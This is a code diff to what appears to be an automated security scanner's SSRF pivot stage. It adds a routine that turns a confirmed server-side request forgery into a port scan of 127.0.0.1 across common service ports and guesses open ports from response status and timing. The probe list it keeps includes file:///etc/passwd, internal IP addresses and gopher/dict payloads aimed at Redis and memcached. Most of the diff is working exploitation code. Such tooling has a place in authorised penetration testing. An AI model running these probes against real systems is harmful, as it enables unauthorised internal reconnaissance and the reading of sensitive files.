@@ -23,10 +23,11 @@ class SSRFPivotStage(Stage):
         "http://10.0.0.1",
         "http://172.17.0.1",
         "file:///etc/passwd",
-        "file:///c:/windows/win.ini",
         "dict://127.0.0.1:11211/stat",
         "gopher://127.0.0.1:6379/_INFO",
     ]
+    
+    COMMON_PORTS = [21, 22, 25, 80, 443, 3306, 5432, 6379, 8000, 8080, 8443, 9000, 27017]
 
     def is_enabled(self, context: PipelineContext) -> bool:
         return bool(getattr(context.runtime_config, "enable_ssrf_pivot", True))
@@ -39,14 +40,37 @@ class SSRFPivotStage(Stage):
         if not verified_ssrf:
             return
 
-        context.logger.info("Found %d confirmed SSRF(s). Starting internal pivoting...", len(verified_ssrf))
+        context.logger.info("Found %d confirmed SSRF(s). Starting internal pivoting & port scanning...", len(verified_ssrf))
         
         async with httpx.AsyncClient(verify=False, timeout=10) as client:
             for ssrf in verified_ssrf:
                 url = ssrf.get("url")
                 if not url: continue
                 
+                # 1. Test standard probes
                 await self._pivot_internal(context, client, url)
+                
+                # 2. Test internal port scan
+                await self._scan_internal_ports(context, client, url)
+
+    async def _scan_internal_ports(self, context: PipelineContext, client: httpx.AsyncClient, url: str) -> None:
+        """Attempts to scan internal ports via the SSRF vulnerability."""
+        base_host = "127.0.0.1"
+        for port in self.COMMON_PORTS:
+            probe = f"http://{base_host}:{port}"
+            test_url = self._inject_probe(url, probe)
+            try:
+                # Use a shorter timeout for port scanning to detect differences
+                start = time.time()
+                resp = await client.get(test_url, timeout=5)
+                duration = time.time() - start
+                
+                # Indicators of an open port:
+                # 1. 200 OK or other non-error status
+                # 2. Significant time difference (timeout vs immediate reset)
+                if resp.status_code < 500 or duration > 4.5:
+                    self._report_pivot(context, url, probe, f"Port {port} potentially OPEN (Status: {resp.status_code})")
+            except Exception: pass
 
     async def _pivot_internal(self, context: PipelineContext, client: httpx.AsyncClient, url: str) -> None:
         for probe in self.INTERNAL_PROBES:
